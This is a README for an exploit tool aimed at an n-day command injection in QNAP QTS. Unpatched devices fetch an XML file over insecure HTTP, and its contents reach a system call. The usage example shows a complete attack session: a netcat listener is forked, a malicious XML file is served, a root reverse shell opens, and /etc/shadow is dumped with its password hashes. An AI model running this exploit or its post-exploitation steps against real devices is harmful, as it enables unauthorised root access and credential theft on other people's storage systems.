# Overkill

Overkill is an exploit for a patched vulnerability affecting QNAP QTS. Due to the way QNAP discloses vulnerabilities, I'm unsure if this issue has a CVE or not. However, it was likely patched in November 2020 and April 2021. The n-day was "discovered" while doing diff analysis for CVE-2020-2509. This is almost certainly not CVE-2020-2509. 

The exploit will send HTTP GET requests to `/cgi-bin/qnapmsg.cgi?lang=xxx` which will cause unpatched QNAP devices to download an XML file from `update.qnap.com` via insecure HTTP. An attacker that can redirect `update.qnap.com` to themselves can respond with an attacker controlled XML file. When the QNAP parses the XML file it will pass some of the contents to a `system` call, resulting in a reverse shell.

This exploit *does not* implement the method to get `update.qnap.com` requests directed to the exploit. In the example below, I was using router DNS hijacking on my own router... your mileage may vary.

## Usage Example

```
albinolobster@ubuntu:~/overkill$ sudo python3 overkill.py --rhost 10.12.70.251 --lhost 10.12.70.252

01001001001000000110001101100001011011100010011101110100001000000110011101100101
    ______  ___      ___  _______   _______   __   ___   __    ___      ___ 
   /    " \|"  \    /"  |/"     "| /"      \ |/"| /  ") |" \  |"  |    |"  |
  // ____  \\   \  //  /(: ______)|:        |(: |/   /  ||  | ||  |    ||  |
 /  /    ) :)\\  \/. ./  \/    |  |_____/   )|    __/   |:  | |:  |    |:  |
(: (____/ //  \.    //   // ___)_  //      / (// _  \   |.  |  \  |___  \  |___
 \        /    \\   /   (:      "||:  __   \ |: | \  \  /\  |\( \_|:  \( \_|:  \
  \"_____/      \__/     \_______)|__|  \___)(__|  \__)(__\_|_)\_______)\_______)

01110100001000000111010001101111001000000111001101101100011001010110010101110000

                                🦞 jbaines-r7

[+] Forking a netcat listener
[+] Using /usr/bin/nc
Listening on 0.0.0.0 1270
[+] Spinning up HTTP server
[!] Attempting http://10.12.70.251:8080/cgi-bin/qnapmsg.cgi?lang=eng
[+] Received an HTTP request from 10.12.70.251 on 27/Jul/2022 11:58:23
[*] Requested /loginad//qnapmsg_eng.xml
10.12.70.251 - - [27/Jul/2022 11:58:23] "GET /loginad//qnapmsg_eng.xml HTTP/1.1" 200 -
Connection received on 10.12.70.251 44630
bash-3.2# uname -a
uname -a
Linux NAS4A32F3 4.2.8 #1 SMP Sun Nov 8 01:50:48 CST 2020 aarch64 GNU/Linux
bash-3.2# id
id
uid=0(admin) gid=0(administrators)
bash-3.2# cat /etc/shadow
cat /etc/shadow
admin:!$1$5pFeLUat$D8jTQogWJy0HF3XjkD13q/:19181:0:99999:7:::
guest:$1$$ysap7EeB9ODCrO46Psdbq/:14233:0:99999:7:::
httpdusr:!:19181:0:99999:7:::
albinolobster:$1$cZCC65z5$NXtIBB4hgqzVG.PHyShKh1:19195:0:99999:7:::
[sshd]:!:19181:0:99999:7:::
bash-3.2# exit  
```

## Credit

* [Overkill](https://www.youtube.com/watch?v=vB_IynOTQU0) by Lazlo Bane featuring Colin Hay

